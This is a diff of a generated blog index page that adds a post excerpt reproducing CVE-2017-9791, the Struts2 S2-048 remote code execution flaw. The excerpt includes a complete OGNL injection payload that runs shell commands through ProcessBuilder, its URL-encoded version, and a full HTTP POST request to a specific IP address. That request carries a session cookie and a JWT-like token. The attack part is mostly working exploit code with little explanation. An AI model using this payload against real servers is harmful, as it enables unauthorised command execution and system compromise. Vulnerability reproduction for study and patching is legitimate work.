@@ -17,7 +17,7 @@
     <link rel="shortcut icon" href="/favicon.ico" >
     
     
-<link rel="stylesheet" href="/css/style.css?v=1615172862362.css">
+<link rel="stylesheet" href="/css/style.css?v=1615254356041.css">
 
     <!--[if lt IE 9]>
     
@@ -111,6 +111,59 @@
             
         </strong>
     </h3>
+    
+        <!-- 文章列表 item -->
+<article class="post">
+    <header>
+        <!-- 标签这有且只能显示一个 -->
+        
+            <a href="javascript: void(0);" class="cat">未分类</a>
+        
+        <!-- 文章标题 -->
+        
+    <h3 class="post-title">
+    	<a href="https://givemefivw.github.io/2020/12/20/CVE-2017-9791-Struts2-S2-048%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">
+    		CVE-2017-9791 Struts2 S2-048远程代码执行漏洞
+    	</a>
+    </h3>
+
+    </header>
+    <p class="post-meta">
+        Jelon 发表于
+        <time datetime="2020-12-20T11:42:12.000Z">2020-12-20</time>
+        &nbsp;&nbsp;
+        <span class="post-tags">
+            标签：
+            
+        </span>
+    </p>
+
+    <div class="post-content">
+        <div class="post-excerpt">
+            
+                <h2 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h2><p>CVE-2017-9791即st2-048漏洞，是在Struts 2.3.x 系列的 Showcase 应用中演示Struts2整合Struts 1 的插件中存在一处任意代码执行漏洞。当你的应用使用了Struts2 Struts1的插件时，可能导致不受信任的输入传入到ActionMessage类中导致命令执行。</p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>启动镜像，访问地址<br><img src="/2020/12/20/CVE-2017-9791-Struts2-S2-048%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/1.png"><br>选择<code>Integration</code>中的<code>Struts 1 Integration</code><br><img src="/2020/12/20/CVE-2017-9791-Struts2-S2-048%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/2.png"><br>在<code>Gangster Name</code>栏填入<code>$&#123;10+10&#125;</code>，其他两处随意<br>点击Submit<br><img src="/2020/12/20/CVE-2017-9791-Struts2-S2-048%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/3.png"><br>可以看到加和结果被输出，证明存在漏洞<br>再次访问<code>http://8.131.79.166:23044/integration/editGangster.action</code>页面并抓包。<br>构造payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%&#123;(#_&#x3D;&#39;multipart&#x2F;form-data&#39;).(#dm&#x3D;@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess&#x3D;#dm):((#container&#x3D;#context[&#39;com.opensymphony.xwork2.ActionContext.container&#39;]).(#ognlUtil&#x3D;#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd&#x3D;&#39;id&#39;).(#iswin&#x3D;(@java.lang.System@getProperty(&#39;os.name&#39;).toLowerCase().contains(&#39;win&#39;))).(#cmds&#x3D;(#iswin?&#123;&#39;cmd.exe&#39;,&#39;&#x2F;c&#39;,#cmd&#125;:&#123;&#39;&#x2F;bin&#x2F;bash&#39;,&#39;-c&#39;,#cmd&#125;)).(#p&#x3D;new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process&#x3D;#p.start()).(#ros&#x3D;(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125;</span><br></pre></td></tr></table></figure>
+<p>将poc进行url转码后再复制进burp</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%25%7B(#_&#x3D;&#39;multipart&#x2F;form-data&#39;).(#dm&#x3D;@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess&#x3D;#dm):((#container&#x3D;#context%5B&#39;com.opensymphony.xwork2.ActionContext.container&#39;%5D).(#ognlUtil&#x3D;#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd&#x3D;&#39;id&#39;).(#iswin&#x3D;(@java.lang.System@getProperty(&#39;os.name&#39;).toLowerCase().contains(&#39;win&#39;))).(#cmds&#x3D;(#iswin?%7B&#39;cmd.exe&#39;,&#39;&#x2F;c&#39;,#cmd%7D:%7B&#39;&#x2F;bin&#x2F;bash&#39;,&#39;-c&#39;,#cmd%7D)).(#p&#x3D;new%20java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process&#x3D;#p.start()).(#ros&#x3D;(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())%7D</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;integration&#x2F;saveGangster.action HTTP&#x2F;1.1</span><br><span class="line">Host: 8.131.79.166:23044</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko&#x2F;20100101 Firefox&#x2F;82.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 880</span><br><span class="line">Origin: http:&#x2F;&#x2F;8.131.79.166:23044</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Referer: http:&#x2F;&#x2F;8.131.79.166:23044&#x2F;integration&#x2F;editGangster.action</span><br><span class="line">Cookie: vue_admin_template_token&#x3D;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNjA0OTA0NTE3LCJlbWFpbCI6ImFkbWluQGZvZmEuc28ifQ.cnUXMot8Y5FRQcJmdi0cs_i_4qeOOI_ErmLvNXs_j54; JSESSIONID&#x3D;ACF5C40D8897FB6D69768EA0A1FCDA79</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">name&#x3D;%25%7B(#_&#x3D;&#39;multipart&#x2F;form-data&#39;).(#dm&#x3D;@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess&#x3D;#dm):((#container&#x3D;#context%5B&#39;com.opensymphony.xwork2.ActionContext.container&#39;%5D).(#ognlUtil&#x3D;#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd&#x3D;&#39;ls&#39;).(#iswin&#x3D;(@java.lang.System@getProperty(&#39;os.name&#39;).toLowerCase().contains(&#39;win&#39;))).(#cmds&#x3D;(#iswin?%7B&#39;cmd.exe&#39;,&#39;&#x2F;c&#39;,#cmd%7D:%7B&#39;&#x2F;bin&#x2F;bash&#39;,&#39;-c&#39;,#cmd%7D)).(#p&#x3D;new%20java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process&#x3D;#p.start()).(#ros&#x3D;(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())%7D&amp;age&#x3D;s&amp;__checkbox_bustedBefore&#x3D;true&amp;description&#x3D;s</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/12/20/CVE-2017-9791-Struts2-S2-048%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/4.png"></p>
+
+            
+            <p class="more">
+                <a href="https://givemefivw.github.io/2020/12/20/CVE-2017-9791-Struts2-S2-048%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">阅读剩下更多</a>
+            </p>
+        </div>
+        <div class="post-thumbnail" data-img="">
+            <a href="https://givemefivw.github.io/2020/12/20/CVE-2017-9791-Struts2-S2-048%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" title="CVE-2017-9791 Struts2 S2-048远程代码执行漏洞">
+                
+                    <img class="thumbnail" src="/img/default.png" data-echo="/img/thumbnail/0.jpg" alt="默认配图" >
+                
+            </a>
+        </div>
+    </div>
+</article>
+
     
         <!-- 文章列表 item -->
 <article class="post">
@@ -578,7 +631,7 @@
     
     <li>
         <a href="/categories/POC-EXP/">POC&amp;EXP</a>
-        <span class="badge">(12)</span>
+        <span class="badge">(13)</span>
     </li>
     
     <li>
@@ -602,7 +655,7 @@
   
     <a class="tag-item" href="/tags/%E5%A4%8D%E7%8E%B0/" title="复现">复现 (7)</a>
   
-    <a class="tag-item" href="/tags/POC/" title="POC">POC (9)</a>
+    <a class="tag-item" href="/tags/POC/" title="POC">POC (10)</a>
   
     <a class="tag-item" href="/tags/%E5%85%8D%E6%9D%80%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/" title="免杀实验笔记">免杀实验笔记 (5)</a>
   
@@ -656,7 +709,7 @@
     <!--博客js脚本 -->
     <!-- 这里放网站js脚本 -->
 
-<script src="/js/main.js?v=1615172862363.js"></script>
+<script src="/js/main.js?v=1615254356047.js"></script>
 
 
 </body>
